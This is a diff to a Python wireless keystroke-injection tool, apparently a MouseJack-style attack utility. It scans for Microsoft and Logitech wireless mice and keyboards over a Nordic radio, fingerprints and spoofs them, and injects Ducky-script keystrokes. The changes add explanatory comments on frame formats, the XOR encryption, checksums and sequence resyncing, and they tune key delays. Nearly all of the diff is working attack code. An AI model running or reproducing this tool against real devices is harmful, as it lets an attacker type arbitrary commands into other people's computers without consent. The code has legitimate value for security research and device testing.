@@ -22,6 +22,7 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
+# some constants for fingerprinting
 MS_MOUSE = 1
 MS_MOUSE_ENC = 2
 MS_KEYBOARD_ENC = 3
@@ -242,6 +243,7 @@ class DuckyParser(object):
 
 
 class NordicScanner(object):
+    ''' Class for scanning, pinging and fingerprint devices '''
 
     def __init__(self, radio, ack_timeout=5, retries=1, debug=False):
         self.radio = radio
@@ -343,6 +345,7 @@ class NordicScanner(object):
 
 
 class MicrosoftHID(object):
+    ''' Injection code for MS devices '''
 
     def __init__(self, detect, radio, address, payload, key_delay):
         self.radio = radio
@@ -355,6 +358,14 @@ class MicrosoftHID(object):
         self.device_vendor = 'Microsoft'
         self.key_delay = key_delay
 
+        # MS attacks are a little more varied
+        # Some older devices send everything in the clear
+        # Some send keystrokes encrypted and mouse data with XOR obfuscation
+        # Some send mouse and key data encrypted
+
+        # It's also worth mentioning that we need to see a
+        # real MS frame before we attack. There are a bunch
+        # of numbers in the header that need to match
         if detect == MS_MOUSE:
             self.device_type = 2
             self.encrypted = False
@@ -390,6 +401,7 @@ class MicrosoftHID(object):
         return val.replace(':', '').decode('hex')
 
     def xor_crypt(self, pay):
+        # MS encryption algorithm - as per KeyKeriki paper
         p = pay[:]
         for i in range(4, len(p)):
             p[i] ^= ord(self.raw_address[(i - 4) % 5])
@@ -402,12 +414,14 @@ class MicrosoftHID(object):
             return str(bytearray(p))
 
     def checksum(self):
+        # MS checksum algorithm - as per KeyKeriki paper
         self.payload[-1] = 0
         for i in range(0, len(self.payload) - 1):
             self.payload[-1] ^= self.payload[i]
         self.payload[-1] = ~self.payload[-1] & 0xff
 
     def inc_sequence(self):
+        # MS frames use a 2 bytes sequence number
         if self.payload[4] == 255:
             self.payload[5] += 1
             self.payload[4] = 0
@@ -418,6 +432,8 @@ class MicrosoftHID(object):
         if self.device_type == 1:
             self.payload[7] = 0
             self.payload[9] = key['hid']
+            # FIXME: seem to be missing the Ctrl and Alt flags
+            # for MS keyboards
             if key['meta']:
                 self.payload[7] |= 0x08
             if key['shift']:
@@ -441,7 +457,13 @@ class MicrosoftHID(object):
             self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
 
     def post_keystroke_delay(self):
-        time.sleep(self.key_delay / 1000.0)
+        if self.key_delay:
+            time.sleep(self.key_delay / 1000.0)
+        else:
+            # Some MS devices will work with 0 delay
+            # Others (encrypted devices during testing) required 5 ms or
+            # keys would be dropped
+            time.sleep(0.005)
 
     def send_key(self, c=None):
         if not c:
@@ -458,6 +480,8 @@ class MicrosoftHID(object):
         self.post_keystroke_delay()
 
     def send_attack(self, attack):
+        # We need to force the device to re-sync starting at 
+        # sequence number 0
         for _ in range(5):
             self.send_key()
 
@@ -465,6 +489,7 @@ class MicrosoftHID(object):
             for c in bar:
                 if c['hid']:
                     self.send_key(c)
+                    # Need to send a null after the HID code, otherwise the key is "stuck"
                     self.send_key()
                 elif c['sleep']:
                     time.sleep(int(c['sleep']) / 1000.0)
@@ -473,6 +498,7 @@ class MicrosoftHID(object):
 
 
 class LogitechHID(object):
+    ''' Injection for Logitech devices '''
 
     def __init__(self, detect, radio, address, payload, key_delay):
         self.radio = radio
@@ -485,6 +511,13 @@ class LogitechHID(object):
         self.device_vendor = 'Logitech'
         self.key_delay = key_delay
 
+        # We always use mouse frames anyway
+        # "mouse frames" isn't strictly accurate -- multimedia key frames look the same
+        # If you read up on the HID++ protocol the attack is pretty obvious IMHO
+
+        # For logitech, we can create a frame from scratch
+        # but we still need a frame to tell us that it's Logitech
+        # And we need to know the address of the device to hijack
         if detect == LOG_MOUSE:
             self.device_type = 2
             self.encrypted = False
@@ -509,6 +542,8 @@ class LogitechHID(object):
         return str(bytearray(p))
 
     def checksum(self):
+        # This is also from the KeyKeriki paper
+        # Thanks Thorsten and Max!
         cksum = 0xff
         for n in range(0, len(self.payload) - 1):
             cksum = (cksum - self.payload[n]) & 0xff
@@ -528,10 +563,20 @@ class LogitechHID(object):
             self.payload[2] |= 0x01
 
     def clear_payload(self):
+        # Mouse frames use type 0xC2
+        # Multmedia key frames use type 0xC3
+        # To see why this works, read diagram 2.3.2 of:
+        # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
+        # (discovered by wiresharking usbmon)
         self.payload = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
 
     def post_keystroke_delay(self):
-        time.sleep(self.key_delay / 1000.0)
+        if self.key_delay:
+            time.sleep(self.key_delay / 1000.0)
+        else:
+            # This could use some tuning
+            # Tested on macOS, 5 ms was too fast and dropped keys
+            time.sleep(0.01)
 
     def send_key(self, c=None):
         if not c:
@@ -551,6 +596,7 @@ class LogitechHID(object):
             for c in bar:
                 if c['hid']:
                     self.send_key(c)
+                    # Need to send a null after the HID code, otherwise the key is "stuck"
                     self.send_key()
                 elif c['sleep']:
                     time.sleep(int(c['sleep']) / 1000.0)
@@ -589,7 +635,7 @@ def confirmroot():
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-@click.option('--keydelay', default=10, help="Inter-key delay in milliseconds")
+@click.option('--keydelay', default=0, help="Inter-key delay in milliseconds", type=click.INT)
 def cli(debug, script, lowpower, interval, keydelay):
 
     banner()
@@ -689,8 +735,10 @@ def cli(debug, script, lowpower, interval, keydelay):
             address = target['address']
             device_type = target['device']
 
+            # Sniffer mode allows us to spoof the address
             scan.sniff(address)
             device = None
+            # Figure out what we've got
             device_type = scan.fingerprint_device(payload)
             if device_type == MS_MOUSE or device_type == MS_MOUSE_ENC or device_type == MS_KEYBOARD_ENC:
                 device = MicrosoftHID(device_type, radio, address, payload, keydelay)
@@ -698,6 +746,7 @@ def cli(debug, script, lowpower, interval, keydelay):
                 device = LogitechHID(device_type, radio, address, payload, keydelay)
 
             if device:
+                # Attempt to ping the devices to find the current channel
                 lock_channel = scan.acquire_channel(address)
 
                 if lock_channel:
@@ -705,6 +754,7 @@ def cli(debug, script, lowpower, interval, keydelay):
                     print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, lock_channel)
                     device.send_attack(attack)
                 else:
+                    # If our pings fail, go full hail mary
                     print R + '[-] ' + W + 'Ping failed, trying all channels'
                     for channel in channels:
                         radio.set_channel(channel)
